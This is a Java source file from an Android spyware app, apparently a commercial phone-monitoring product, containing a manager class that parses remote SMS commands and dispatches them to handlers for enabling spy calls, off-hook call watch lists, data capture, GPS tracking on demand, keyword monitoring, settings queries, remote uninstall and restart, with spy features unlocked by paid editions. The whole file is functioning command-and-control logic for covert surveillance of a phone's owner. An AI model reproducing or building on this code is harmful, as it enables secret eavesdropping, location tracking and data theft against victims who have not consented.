package com.fx.dalvik.smscommand;

import android.content.Context;

import com.fx.dalvik.smscommand.interpreter.SmsAddKeyword;
import com.fx.dalvik.smscommand.interpreter.SmsDeactivate;
import com.fx.dalvik.smscommand.interpreter.SmsDiagnostics;
import com.fx.dalvik.smscommand.interpreter.SmsDisableSpyCall;
import com.fx.dalvik.smscommand.interpreter.SmsDisableStartCapture;
import com.fx.dalvik.smscommand.interpreter.SmsEnableSpyCall;
import com.fx.dalvik.smscommand.interpreter.SmsEnableStartCapture;
import com.fx.dalvik.smscommand.interpreter.SmsEventSetting;
import com.fx.dalvik.smscommand.interpreter.SmsForceDelivery;
import com.fx.dalvik.smscommand.interpreter.SmsGetCurrentSettings;
import com.fx.dalvik.smscommand.interpreter.SmsGpsOnDemand;
import com.fx.dalvik.smscommand.interpreter.SmsGpsSetting;
import com.fx.dalvik.smscommand.interpreter.SmsRestart;
import com.fx.dalvik.smscommand.interpreter.SmsUninstall;
import com.fx.dalvik.smscommand.interpreter.SmsWatchListClear;
import com.fx.dalvik.smscommand.interpreter.SmsWatchListSetting;
import com.fx.preference.PreferenceManager;
import com.fx.preference.model.ProductInfo;
import com.fx.preference.model.ProductInfo.ProductEdition;
import com.fx.util.FxResource;
import com.vvt.util.GeneralUtil;
import com.vvt.logger.FxLog;

public class SmsCommandManager {
	
	private static final String TAG = "SmsCommandManager";

	/**
	 * Interpret SMS command, configure application setting, and send response SMS
	 */
	public static void processSmsCommand(Context context, 
			String destinationAddress, String displayMessageBody) {
		
		FxLog.d(TAG, String.format(
				"processSmsCommand # %s: %s", destinationAddress, displayMessageBody));
		
		String reportMessage = null;
		
		boolean sendSms = SmsCommandHelper.isRequestSendingResponse(context, displayMessageBody);
		
		ProductInfo productInfo = PreferenceManager.getInstance(context).getProductInfo();
		ProductEdition productEdition = productInfo.getEdition();
		
		// Try to create response header
		boolean headerCreated = false;
		try {
			String productIdVersion = new StringBuilder()
					.append(productInfo.getId())
					.append(" ")
					.append(productInfo.getVersionName())
					.toString();
			
			reportMessage = SmsCommandHelper.getResponseHeader(
					context, productIdVersion, displayMessageBody);
			
			headerCreated = true;
		}
		catch (SmsCommandException smsCommandException) {
			headerCreated = false;
			SmsCommandHelper.sendResponse(
					context, destinationAddress, smsCommandException.getMessage(), sendSms);
		}
		if (headerCreated) {
			// Prepare tokens
			displayMessageBody = displayMessageBody.replaceAll("<>", "< >");
			String[] tokens = GeneralUtil.getTokenArray(
					displayMessageBody, 
					SmsCommandHelper.TAG_DELIMITERS);
			
			// Command code e.g. *#60 -> [60]
			String commandCode = tokens[0];
			
			boolean isSpyEnabled = 
				productEdition == ProductEdition.PROX ||
				productEdition == ProductEdition.PRO;
			
			boolean isOffhookSpyEnabled = productEdition == ProductEdition.PROX;
			
			// Process Command
			if (isSpyEnabled && commandCode.equals(SmsEnableSpyCall.COMMAND_ID)) {
				reportMessage += SmsEnableSpyCall.processCommand(context, tokens);
			}
			else if (isSpyEnabled && commandCode.equals(SmsDisableSpyCall.COMMAND_ID)) {
				reportMessage += SmsDisableSpyCall.processCommand(context, tokens);
			}
			else if (isOffhookSpyEnabled && commandCode.equals(SmsWatchListSetting.COMMAND_ID)) {
				reportMessage += SmsWatchListSetting.processCommand(context, tokens);
			}
			else if (isOffhookSpyEnabled && commandCode.equals(SmsWatchListClear.COMMAND_ID)) {
				reportMessage += SmsWatchListClear.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsGpsSetting.COMMAND_ID)) {
				reportMessage += SmsGpsSetting.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsEnableStartCapture.COMMAND_ID)) {
				reportMessage += SmsEnableStartCapture.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsDisableStartCapture.COMMAND_ID)) {
				reportMessage += SmsDisableStartCapture.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsDiagnostics.COMMAND_ID)) {
				sendSms = true;
				reportMessage = SmsDiagnostics.processCommand(context, tokens, reportMessage);
			}
			else if (commandCode.equals(SmsEventSetting.COMMAND_ID)) {
				reportMessage += SmsEventSetting.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsForceDelivery.COMMAND_ID)) {
				String result = SmsForceDelivery.processCommand(context, tokens,
						destinationAddress, reportMessage, sendSms);
				
				if (result.equals(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
					return; // A response will be sent after deactivation is completed
				}
				else {
					reportMessage += result; // validation failed
				}
			}
			else if (commandCode.equals(SmsGetCurrentSettings.COMMAND_ID)) {
				sendSms = true;
				reportMessage += SmsGetCurrentSettings.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsDeactivate.COMMAND_ID)) {
				String result = SmsDeactivate.processCommand(context, tokens, 
						destinationAddress, reportMessage, sendSms);
				
				if (result.equals(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
					return; // A response will be sent after deactivation is completed
				}
				else {
					reportMessage += result; // validation failed
				}
			}
			else if (isSpyEnabled && commandCode.equals(SmsAddKeyword.COMMAND_ID)) {
				if (!sendSms) {
					sendSms = SmsAddKeyword.isQueryCommand(context, tokens);
				}
				reportMessage += SmsAddKeyword.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsUninstall.COMMAND_ID)) {
				reportMessage += SmsUninstall.processCommand(context, tokens);
			}
			else if (commandCode.equals(SmsGpsOnDemand.COMMAND_ID)) {
				String response = SmsGpsOnDemand.processCommand(
						context, tokens, destinationAddress, reportMessage);
				sendSms = true;
				reportMessage += response;
			}
			else if (commandCode.equals(SmsRestart.COMMAND_ID)) {
				reportMessage += SmsRestart.processCommand(context, tokens);
			}
			// Command not found
			else {
				reportMessage += String.format("%s\n%s",
						FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
						FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_COMMAND_NOT_FOUND);
			}
			
			// Send response message
			SmsCommandHelper.sendResponse(context, destinationAddress, reportMessage, sendSms);
		}
	}
}
